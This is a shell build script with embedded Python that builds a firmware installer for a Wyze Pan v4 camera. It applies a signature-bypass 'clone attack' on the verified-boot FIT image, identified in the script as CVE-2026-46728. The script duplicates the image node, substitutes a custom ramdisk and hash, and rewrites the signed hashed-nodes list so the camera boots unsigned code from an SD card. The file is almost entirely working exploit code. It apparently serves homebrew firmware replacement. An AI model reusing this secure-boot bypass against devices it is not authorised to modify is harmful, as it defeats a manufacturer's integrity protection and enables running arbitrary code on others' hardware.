#!/bin/bash
set -e

STOCK_ROM="${1:?Usage: $0 <stock-rom.bin>}"
UBOOT="${2:-rootfs/uboot.bin}"
ENV="${3:-rootfs/uboot-env.bin}"

echo "Building Wyze Pan v4 SD installer"
echo "  Stock ROM: $STOCK_ROM"
echo "  U-Boot:    $UBOOT"
echo "  Env:       $ENV"

for d in proc sys tmp dev; do
    mkdir -p "rootfs/$d"
done
chmod 1777 "rootfs/tmp"

# Copy U-Boot and env into rootfs
cp "$UBOOT" rootfs/uboot.bin
cp "$ENV" rootfs/uboot-env.bin

# Build squashfs ramdisk
rm -f installer.sqfs
mksquashfs rootfs installer.sqfs -noappend -comp xz -all-root
echo "Ramdisk: $(ls -lh installer.sqfs | awk '{print $5}')"

# Build exploit FIT using CVE-2026-46728 clone attack
python3 - "$STOCK_ROM" <<'PYEOF'
import struct, hashlib, sys
sys.path.insert(0, ".")
from vboot_evil import change_property_value, get_prop_value, determine_offset

rom = open(sys.argv[1], "rb").read()
fit_off = 0x30000
totalsize = struct.unpack_from(">I", rom, fit_off + 4)[0]
fit = bytearray(rom[fit_off:fit_off + totalsize])

off_struct = struct.unpack_from(">I", fit, 8)[0]
off_strings = struct.unpack_from(">I", fit, 12)[0]
size_struct = struct.unpack_from(">I", fit, 36)[0]
size_strings = struct.unpack_from(">I", fit, 32)[0]

dt_struct = bytes(fit[off_struct:off_struct + size_struct])
dt_strings = bytes(fit[off_strings:off_strings + size_strings])

installer_rd = open("installer.sqfs", "rb").read()
installer_rd_hash = hashlib.sha256(installer_rd).digest()

(img_start, img_end) = determine_offset(dt_struct, dt_strings, '/images')
img_copy = dt_struct[img_start:img_end]
empty_node = struct.pack('>I', 1) + b"EMPTYNO\0" + struct.pack('>I', 2)
dt_struct = (dt_struct[:img_end - 4]
             + (img_copy[:-4] + empty_node + img_copy[-4:])
             + empty_node
             + dt_struct[img_end - 4:])

dt_struct = change_property_value(dt_struct, dt_strings,
                                  '/images/ramdisk/data', installer_rd)
dt_struct = change_property_value(dt_struct, dt_strings,
                                  '/images/ramdisk/hash/value', installer_rd_hash)

hn = get_prop_value(dt_struct, dt_strings,
                    '/configurations/conf/signature/hashed-nodes')
patched = [b"/images" + n if n.startswith(b"/images/") else n
           for n in hn.split(b"\x00")]
dt_struct = change_property_value(dt_struct, dt_strings,
                                  '/configurations/conf/signature/hashed-nodes',
                                  b"\x00".join(patched))

nos = off_struct + len(dt_struct)
nt = nos + size_strings
nf = bytearray(nt)
nf[:off_struct] = fit[:off_struct]
nf[off_struct:off_struct + len(dt_struct)] = dt_struct
nf[nos:nos + size_strings] = fit[off_strings:off_strings + size_strings]
struct.pack_into(">I", nf, 4, nt)
struct.pack_into(">I", nf, 12, nos)
struct.pack_into(">I", nf, 36, len(dt_struct))

open("factory_wcpanv4_uvc", "wb").write(nf)
print(f"FIT image: {nt} bytes")
PYEOF

echo ""
echo "Output: factory_wcpanv4_uvc"
echo "Copy this file to a FAT32-formatted SD card and insert into the camera."
echo "Power on the camera and the installer will run automatically."
ls -lh factory_wcpanv4_uvc
